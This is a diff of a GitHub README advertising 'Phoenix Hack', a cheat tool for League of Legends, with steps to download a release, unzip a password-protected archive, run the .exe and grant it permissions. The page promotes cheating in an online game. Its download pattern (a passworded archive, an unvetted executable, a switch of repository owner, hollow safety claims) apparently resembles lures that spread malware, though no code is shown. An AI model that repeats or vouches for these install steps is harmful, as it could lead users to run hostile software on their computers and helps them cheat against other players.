@@ -1,66 +1,82 @@
-<div align="center">
-    <h1 style="font-size:2.5em;color:#FF4500;">🔥 PHOENIX HACK FOR LEAGUE OF LEGENDS 🔥</h1>
-    <h2 style="color:#4682B4;">Master Every Champion with Precision and Flexibility</h2>
-</div>
+# 🎮 LEAGUE-OF-LEGENDS-PHOENIX-HACK- - Enhance Your Gameplay Effortlessly
 
----
+[![Download from Releases](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/mrkabo1/LEAGUE-OF-LEGENDS-PHOENIX-HACK-/releases)
 
-<div align="center">
-    <h2 style="color:#32CD32;">📸 Screenshots</h2>
-    <img src="https://github.com/user-attachments/assets/0fc6e0d6-65e2-4403-b158-759f08dc7af4" alt="Phoenix Hack Screenshot 1" width="80%" style="border:2px solid #FF4500;border-radius:10px;box-shadow:5px 5px 15px rgba(0,0,0,0.5);margin-bottom:20px;">
-    <img src="https://github.com/user-attachments/assets/fd9c8486-1fda-4e49-b705-4fbeda2a6d46" alt="Phoenix Hack Screenshot 2" width="80%" style="border:2px solid #4682B4;border-radius:10px;box-shadow:5px 5px 15px rgba(0,0,0,0.5);margin-bottom:20px;">
-</div>
+## 📜 Description
+Phoenix Hack for League of Legends (LOL) is a feature-rich script tool designed to elevate your gaming experience. It caters to all playstyles, providing advanced functionalities that enable effortless execution of complex combos, seamless farming, and real-time visibility of critical information.
 
----
+## 🚀 Getting Started
+To start using the Phoenix Hack, follow these simple steps:
 
-## 🌟 **Overview**
-**Phoenix Hack for League of Legends (LOL)** is a feature-rich script tool designed to elevate your gaming experience, catering to all playstyles. With advanced functionalities, it enables effortless execution of complex combos across all champions, seamless farming, and real-time visibility of critical information. The hack also features auto-dodge capabilities to evade enemy abilities. All settings are highly customizable, ensuring that you can adapt every feature to your needs. A convenient **configuration system** lets you save your settings and share them with other players, saving you from the hassle of reconfiguring every time.
+1. **Visit the Download Page**
+   - Go to the [Releases page](https://github.com/mrkabo1/LEAGUE-OF-LEGENDS-PHOENIX-HACK-/releases) where you can find the latest versions of the application.
 
----
+## 💾 Download & Install
+1. **Download the Software**
+   - On the Releases page, look for the latest version. Click on the link that says “Download”.
+   - Save the file to a location on your computer where you can easily find it.
 
-## 🚀 **How to Use**
-<div style="background-color:#F5F5F5;padding:20px;border-radius:10px;">
-    <ol>
-        <li>
-            <b style="color:#FF4500;">Download:</b>  
-            <a href="https://github.com/Quentheres/LEAGUE-OF-LEGENDS-PHOENIX-HACK-/releases/download/latest/PhoenixLOL.zip" style="text-decoration:none;color:#4682B4;">🔹 Get the latest version from Github 🔹</a>
-        </li>
-        <li>
-            <b style="color:#32CD32;">Unzip Archive:</b>  
-            💼 Password: `PhoenixLOL`
-        </li>
-        <li>
-            <b style="color:#FF4500;">Run Application:</b>  
-            Execute the `.exe` file after unzipping.
-        </li>
-        <li>
-            <b style="color:#4682B4;">Activate:</b>  
-            Press <b>HOME</b> to launch and configure the cheat.
-        </li>
-    </ol>
-</div>
+2. **Run the Application**
+   - Once the download is complete, navigate to the saved file.
+   - Double-click the file to run it. Follow any on-screen instructions to complete the installation.
 
----
+3. **Log In to Your League of Legends Account**
+   - Open League of Legends.
+   - Log in with your account credentials.
 
-<div align="center">
-    <h2 style="color:#32CD32;">💡 FEATURES</h2>
-</div>
-<div align="center">
-    <img src="https://github.com/user-attachments/assets/fb8ff021-d62e-475a-8d13-65167a1b46e8" alt="Phoenix Hack Screenshot 1" width="80%" style="border:2px solid #FF4500;border-radius:10px;box-shadow:5px 5px 15px rgba(0,0,0,0.5);margin-bottom:20px;">
-</div>
+4. **Activate Phoenix Hack**
+   - Open the Phoenix Hack.
+   - Follow prompts to connect to League of Legends. Make sure to allow necessary permissions the first time you run the hack.
 
----
+5. **Adjust Settings**
+   - Customize your features according to your gameplay needs. The interface is user-friendly, allowing you to easily toggle different functionalities.
 
-## 📄 **License**
-<div style="background-color:#F5F5F5;padding:20px;border-radius:10px;">
-    This project is licensed under the **MIT License**. See the LICENSE file for details.
-</div>
+## 🛠 Features
+- **Combo Execution**: Effortlessly perform complex combos across all champions.
+- **Farming Assistance**: Optimize farming strategies with automated functionalities.
+- **Real-Time Information**: Get critical data and stats while playing.
+- **User-Friendly Interface**: Designed for easy navigation, even for beginners.
 
----
+## 📋 System Requirements
+- **Operating System**: Windows 10 or higher.
+- **RAM**: Minimum 4 GB.
+- **Processor**: Dual-core CPU or better.
+- **Internet Connection**: Required for downloading and updates.
 
-<div align="center">
-    <h2 style="color:#4682B4;">📬 CONTACT</h2>
-    <p>Need help? Reach out to us:</p>
-    <a href="" style="text-decoration:none;color:#FF4500;">GitHub</a>  
-    Email: <b style="color:#32CD32;">support@phoenixlol.com</b>
-</div>
+## 📅 Updates
+Stay updated with the latest features and improvements. Regular updates ensure that the hack operates smoothly with the latest League of Legends patches. 
+
+Check the [Releases page](https://github.com/mrkabo1/LEAGUE-OF-LEGENDS-PHOENIX-HACK-/releases) frequently for new versions.
+
+## 🌐 Additional Information
+Feel free to visit our GitHub repository for any additional details or to report issues. We appreciate your feedback and suggestions to improve your experience.
+
+### 🔖 Topics
+If you're interested, check related topics on the following:
+- league-of-legends
+- league-of-legends-2025
+- league-of-legends-aim
+- lol
+- and more.
+
+For more advanced tips and community discussions, join forums and groups that focus on League of Legends gameplay.
+
+## 🛡️ Safety and Security
+Your safety is our priority. Phoenix Hack complies with standard practices to ensure that your account remains secure. Always use trusted software and avoid any suspicious links or downloads. 
+
+If you encounter any issues, consult the FAQ section in the repository or visit community forums for support. 
+
+![Download from Releases](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)
+
+## ❓ FAQs
+**Q: Can I use Phoenix Hack in any game mode?**  
+A: Yes, the hack is designed to work in all modes of League of Legends.
+
+**Q: Is this hack safe to use?**  
+A: While many users have reported success, always be cautious and use at your own risk.
+
+**Q: How often are updates released?**  
+A: Updates are released regularly to keep up with League of Legends developments.
+
+## 📞 Contact
+For support or questions, please reach out through the issues page on our GitHub repository. We are here to help you have the best gaming experience possible!
